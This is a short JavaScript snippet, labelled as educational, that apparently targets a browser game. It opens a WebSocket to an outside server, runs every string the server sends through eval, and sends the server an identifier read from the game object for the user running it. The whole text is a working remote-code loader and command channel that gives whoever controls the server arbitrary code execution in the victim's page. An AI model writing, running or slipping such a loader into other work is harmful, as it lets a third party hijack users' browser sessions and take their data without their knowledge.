// Contributed exclusively for the sake of educational purposes.
(async function(){
  target_ws = "myserver.org:3000"; // Server to connect to
  eval_stream = new WebSocket("wss://"+target_ws);

  eval_stream.addEventListener("message", (msg)=>{
    if(typeof msg.data == "string") eval(msg.data); // Server sends over script in form of string.
  })

  eval_stream.addEventListener("open", ()=>{
    eval_stream.send("+" + ig.game.O4269.O2507); // Notify server of user running the script.
  })
})();
